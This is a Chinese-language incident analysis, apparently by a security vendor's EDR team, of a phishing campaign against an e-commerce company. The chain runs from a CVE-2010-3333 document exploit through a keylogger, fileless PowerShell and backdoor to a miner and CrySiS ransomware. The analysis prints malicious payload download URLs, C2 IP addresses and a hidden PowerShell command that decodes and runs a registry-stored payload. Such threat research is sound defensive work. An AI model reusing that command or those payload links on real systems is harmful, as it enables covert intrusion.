# 从某电商钓鱼事件探索黑客“一站式服务”

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=MjM5NjA0NjgyMA==&mid=2651072399&idx=4&sn=0e08f697625b8badb0589b3850ab02b0&chksm=bd1fb5048a683c12cc565e1456021c68763428b311d550459ec075d4aa14200c2ca170fc1285&scene=27#wechat\_redirect](http://mp.weixin.qq.com/s?__biz=MjM5NjA0NjgyMA==&mid=2651072399&idx=4&sn=0e08f697625b8badb0589b3850ab02b0&chksm=bd1fb5048a683c12cc565e1456021c68763428b311d550459ec075d4aa14200c2ca170fc1285&scene=27#wechat_redirect)

**深信服EDR安全团队，整理分析了一起某电商钓鱼事件，通过关联信息，发现背后可能存在一个“产业链齐全”的黑客团伙，研究发现其具备“一站式服务”的黑客攻击手段。**

黑客攻击手段包括但不限于钓鱼邮件、漏洞利用、挖矿病毒、勒索病毒、无文件攻击、远控木马、键盘记录器、密码破解等，是一次完整而全套的“服务”。

![](../Images/2b3330ef05f7ef4b2e89e219972e653f.png)

最开始，可能仅仅是一封精心构造的邮件触发的，经过信息收集和远程控制，在闲时挖矿榨干主机性能，当窃取到足够机密，又最后“卸磨杀驴”“杀鸡取卵”，执行勒索操作。

![](../Images/e7b42cf7de46cfd4c2578cc947a351ff.png)

## **0x01 定向撒网捞鱼：钓鱼邮件**

XX公司已经被黑客盯上了，黑客通过社工拿到该公司的各种邮件账号，并给这些账号发送了钓鱼邮件。

员工A收到一份邮件，这是一份包含了doc附件（实际上是一份富文本文件）的邮件，doc名称为TransferCopy.doc。

以下是邮件的基本信息：

![](../Images/12accd7007ac4d581b186f723cc8c6c8.png)

看上去是一份无害的文件，点开查看该doc，也未发现异常（但此时已经开始后台偷偷执行）。

## **0x02 苍蝇不叮无缝的蛋：漏洞利用**

苍蝇不叮无缝的蛋，一个普通的doc文档不能触发什么，但是，那是一个特殊构造的文档，里面肯定利用了什么漏洞的。

我们将邮件样本中的Base64加密的附件b64EnTransferCopy.doc提取出来，检测Base64解码的b64DeTransferCopy.doc，发现了b64DeTransferCopy.doc文档中的特殊文本。

![](../Images/60e7565fc6f331324fa74a346b56e380.png)![](../Images/cfe4535d8f719d8fbd247d16e9fd6607.png)

可以判断其利用了CVE-2010-3333，漏洞溢出后，执行了下载动作。

![](../Images/5c7e2ca49182deb59c40ac00dc1e631f.png)

在doc中发现恶意下载链接：

![](../Images/afe100062068573e28b83ffb9cf6b232.png)![](../Images/81a79522babcd927a28878401ff2ac12.png)

“http://polariton.rghost.ru/download/74zJT5wtf/b878e693051a8e541381b1d6378f4ddf62b d96b3/b878e693051a8e541381b1d6378f4ddf62bd96b3/b878e693051a8e541381b1d6378f 4ddf62bd96b3/DFGHDFGHJ4567856.exe”

访问这个网址之后，会跳转到http://rgho.st/74zJT5wtf?r=1088

## **0x03 侦查兵先行：下载木马**

渗透企业内网，免不了先侦查内部主机信息的，黑客最开始，选择了下载并执行木马，完成初步的信息收集和远程控制。

我们将这个样本下载下来，检测为.NET程序，程序没有加壳，但是经过了混淆。

![](../Images/c078b33bd08f4d0b44d1b445f0e8f659.png)

通过De4dot反混淆得到如下信息，但是程序还是存在一定的混淆，采用动态分析。

![](../Images/7929571c210a821f0bee2a23046dbe5e.png)动态分析程序DFGHDFGHJ4567856.exe行为，发现其执行cmd命令 cmd.exe /c systeminfo 获取系统基本信息，写入Info.txt。

![](../Images/b01be529f18b593ec9f36e1f7bf36d8e.png)![](../Images/32d5a1fd8daac7177972dfcfbbae6068.png)

释放AutoUpdate.exe并通过设置注册表，设置其为自启动，进行键鼠记录，将所有的动作记录在logs\_xx.xx.xxxx(日期格式).htm文件。

![](../Images/84b701b75787d5eaa6d1a5afc84ed184.png)![](../Images/0d620a60c13c3d1c994046f497dec1c4.png)

释放键鼠记录器pass.exe并启动，进行密码搜集或者密码破解。

![](../Images/f50a30b9e9d1d299139db09ee2e1755d.png)

该程序在完成所有释放和启动工作后，会使用HTTP协议连接恶意C2进行交互（回传信息）。

![](../Images/3725eb6569fe04944a79bc292ff08813.png)![](../Images/e2491a19b1bdedc49e6f707a29947093.png)

## **0x04 对抗升级：无文件攻击**

为了进一步对抗安全产品，黑客并未停手，采取了更为高级、更为隐蔽的攻击手段。

我们发现，其通过自启动注册表项，启动PowerShell执行相应的命令

```
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -windowstyle hidden -c "$val = (gp HKLM:SOFTWARE\'??').'??'; $d = [System.Text.Encoding]::Unicode.GetString([System.convert]::FromBase64String($val)); iex $d"
```

分析上面的命令，它会读取HKLM:SOFTWARE\\’??’注册表项的内容，然后通过Base64解码之后执行，另一个注册表项的内容是一串Base64的字符串。

![](../Images/a0f14a065cba28de9eeae15e1b6880ad.png)

多次解码之后，得到相应的PowerShell源代码。

![](../Images/5d53ae6e1395250aee6b7d3cf39b2b2e.png)通过PowerShell脚本，创建一个线程，注入一段ShellCode到远程进程中，执行ShellCode，解密出相应的ShellCode代码。

![](../Images/115813581368fb59263ad6b1a9b72caa.png)

通过InternetOpenA/InternetConnectA/HttpOpenRequestA/HttpSendRequestA等函数，连接或发送网络请求到相应的黑客服务器地址138.197.2.46

![](../Images/14092335d001fe63b50567b79da89c78.png)

分配相应的内存空间，从黑客服务器上读取相关的恶意程序到内存。

![](../Images/c909a8cfefa82a94de38829496dd7d27.png)

从黑客服务器上获取到的文件：

![](../Images/68938633302e07b0708492e0fe56b03b.png)

ShellCode通过反射型DLL注入到进程执行：

![](../Images/629287889d5f5c67cb2f8c341de20a7e.png)

分析从内存中Dump出来的文件，是一个后门程序。

后门程序，释放相应的远控恶意程序文件Folder.exe：

![](../Images/16cf23ab8a9f30b04cff73c63108c0a2.png)

Folder.exe拷贝自身到C:\\Users\\panda\\AppData\\Roaming目录下：

![](../Images/592c05facda41274131a2af089bfb14b.png)

并设置一个隐藏目录的文件夹，将文件拷贝到隐藏目录文件夹下：

![](../Images/0aef87e7ee2a2c54d4557f49112375a1.png)

并设置注册表自启动项：

![](../Images/8123bb30c9b321c8bfc3811877287e22.png)

将之前释放到隐藏目录下的副本远控创建为计划任务启动项：

![](../Images/0fa1f5b3a04b5f0ecde5daba60a7b130.png)

黑客可以实时监控这台主机，动态分析显示其与远程C2服务器14.215.177.39地址进行通信。

![](../Images/673a4383fcc428e994d83d336c24d573.png)

## **0x05 持续褥羊毛：挖矿**

黑客在攻破该主机之后，就为该主机种上挖矿病毒，持续榨干其性能。

![](../Images/6b5bdc0388a289c5a049d07d0e347e19.png)

## **0x06 猪养肥了就杀掉：执行勒索**

在某天，黑客觉得信息偷得差不多了，挖矿也挖了一段时间，想最后干票大的。其通过远程进来之后，从网站上下载了一个勒索病毒。

![](../Images/a6a7321c760c77ba52b2575ec94fafd7.png)

下载的网站如下：

http://polariton.rghost.ru/download/74QVXtyvn/5a32f4e1983822ed5d4fcedf2b8d4c276dd77263/5a32f4e1983822ed5d4fcedf2b8d4c276dd77263/Release.zip

运行下载后的程序，会加密主机上的文件，如下所示：

![](../Images/cdf6e8f02fe5fb82e188949469a43d14.png)

并弹出勒索信息界面，研究发现这是一个CrySiS勒索病毒。

![](../Images/6ff197e8c8ad9099b4df6e43cff7bcd0.png)

至此，全套“服务”完成，员工可以下班了。
